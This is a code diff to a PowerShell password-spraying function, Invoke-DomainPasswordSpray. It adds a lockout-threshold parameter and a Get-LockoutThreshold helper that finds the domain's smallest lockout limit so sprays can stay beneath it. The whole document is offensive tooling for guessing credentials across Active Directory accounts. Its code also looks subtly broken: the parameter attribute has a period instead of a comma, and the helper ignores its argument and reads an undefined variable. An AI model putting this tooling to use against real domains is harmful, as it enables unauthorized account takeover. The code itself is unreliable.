@@ -115,6 +115,10 @@ function Invoke-DomainPasswordSpray{
      [int]
      $Window
 
+     [Parameter(Position = 11. Mandatory = $false)]
+     [int]
+     $Threshold
+
     )
 
     if ($Password)
@@ -189,10 +193,20 @@ function Invoke-DomainPasswordSpray{
     {
         $observation_window = $Window
     }
-    else{
+    else
+    {
         $observation_window = Get-ObservationWindow $CurrentDomain
     }
 
+    if ($Threshold)
+    {
+        $lockout_threshold = $Threshold
+    }
+    else
+    {   
+        $lockout_threshold = Get-LockoutThreshold $CurrentDomain
+    }
+    
     Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
     Write-Host "[*] Setting a $observation_window minute wait in between sprays."
 
@@ -549,3 +563,19 @@ function Get-ObservationWindow($DomainEntry)
     $observation_window = $DomainEntry.ConvertLargeIntegerToInt64($lockObservationWindow_attr.Value) / -600000000
     return $observation_window
 }
+
+function Get-LockoutThreshold($DomainEntry)
+{
+    [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
+
+    if ($SmallestLockoutThreshold -eq "0")
+    {
+        Write-Host -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
+    }
+    else
+    {
+        Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SmallestLockoutThreshold login attempts."
+    }
+    return $SmallestLockoutThreshold
+}
+
